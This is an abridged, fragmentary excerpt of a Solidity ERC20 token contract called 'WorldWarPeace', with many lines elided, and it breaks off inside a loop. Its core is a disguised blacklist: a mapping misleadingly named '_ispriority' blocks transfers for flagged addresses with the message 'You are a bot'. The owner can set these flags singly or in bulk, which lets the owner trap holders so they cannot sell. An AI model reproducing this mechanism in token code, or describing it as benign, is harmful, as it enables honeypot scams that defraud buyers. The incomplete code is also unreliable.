...
library Address{
 ...
 contract WorldWarPeace is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _ispriority;
    ...
    uint256 public swapTokensAtAmount = 1000000000000000 * 10**9;
    uint256 public maxBuyLimit = 1000000000000000 * 10**9;
    uint256 public maxSellLimit = 1000000000000000 * 10**9;
    uint256 public maxWalletLimit = 1000000000000000 * 10**9;
    
    uint256 public genesis_block;
    
    address public marketingWallet = 0xaDB972771A67d7649CF46583c5C305b591fbba67;
    address public developmentWallet = 0xaDB972771A67d7649CF46583c5C305b591fbba67;

    string private constant _name = "WorldWarPeace";
    ...
    Taxes public taxes = Taxes(0, 8, 5, 0);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_ispriority[from] && !_ispriority[to], "You are a bot");
    ...
    function updateIspriority(address account, bool state) external onlyOwner{
        _ispriority[account] = state;
    }
    
    function bulkIspriority(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _ispriority[accounts[i]] = state;
